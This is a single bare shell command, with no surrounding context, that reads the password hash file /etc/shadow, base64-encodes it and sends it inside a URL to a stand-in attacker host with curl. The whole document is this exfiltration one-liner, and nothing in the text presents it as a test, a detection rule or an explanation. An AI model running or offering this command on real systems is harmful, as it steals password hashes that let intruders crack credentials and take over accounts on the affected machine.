curl "https://attacker.com/k=`cat /etc/shadow | base64 -w0`"
